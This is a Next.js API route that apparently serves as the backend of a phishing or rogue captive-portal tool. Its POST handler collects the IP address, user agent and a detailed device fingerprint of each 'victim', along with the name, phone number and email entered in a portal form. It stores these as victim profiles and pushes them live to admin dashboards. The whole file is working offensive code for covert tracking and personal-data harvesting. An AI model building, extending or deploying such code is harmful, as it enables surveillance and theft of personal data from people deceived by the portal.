import { NextRequest, NextResponse } from "next/server";
import { addVictim, addVictimWithProfile, notifyClients, notifyCurrentVictim } from "@/lib/sessions";
import { Fingerprint } from "@/lib/fingerprint";

/**
 * POST /api/track
 * 
 * Accepts comprehensive fingerprint data from portal form submission.
 * Stores extended victim profile and notifies admin dashboards.
 */
export async function POST(request: NextRequest) {
    try {
        const userAgent = request.headers.get("user-agent") || "Unknown";
        const forwarded = request.headers.get("x-forwarded-for");
        const ip = forwarded?.split(",")[0] || request.headers.get("x-real-ip") || "Unknown";

        // Try to parse extended fingerprint data
        let body: {
            name?: string;
            phone?: string;
            email?: string;
            fingerprint?: Fingerprint;
        } = {};

        try {
            body = await request.json();
            console.log("Track API received body keys:", Object.keys(body));
            console.log("Has fingerprint?", !!body.fingerprint);
            if (body.fingerprint) {
                console.log("Fingerprint device type:", body.fingerprint.device?.type);
            }
        } catch (e) {
            console.log("Track API failed to parse body:", e);
        }

        // Check if we have extended fingerprint data
        if (body.fingerprint) {
            // Use extended profile tracking
            const profile = await addVictimWithProfile(
                body.fingerprint,
                ip,
                {
                    name: body.name || undefined,
                    phone: body.phone || undefined,
                    email: body.email || undefined,
                }
            );

            // Notify admin dashboards with full profile
            notifyCurrentVictim();
            notifyClients(profile);

            return NextResponse.json({
                success: true,
                victimId: profile.id,
                sessionId: profile.sessionId,
            });
        } else {
            // Legacy tracking (backward compatibility)
            const formData = (body.name || body.phone || body.email) ? {
                name: body.name,
                phone: body.phone,
                email: body.email,
            } : undefined;

            const victim = addVictim(userAgent, ip, formData);
            notifyClients(victim);

            return NextResponse.json({
                success: true,
                victimId: victim.id,
            });
        }
    } catch (error) {
        console.error("Track error:", error);
        return NextResponse.json(
            { success: false, error: "Failed to track" },
            { status: 500 }
        );
    }
}

/**
 * GET /api/track
 * Health check for the tracking endpoint
 */
export async function GET() {
    return NextResponse.json({
        status: "ok",
        message: "Tracking endpoint active",
    });
}
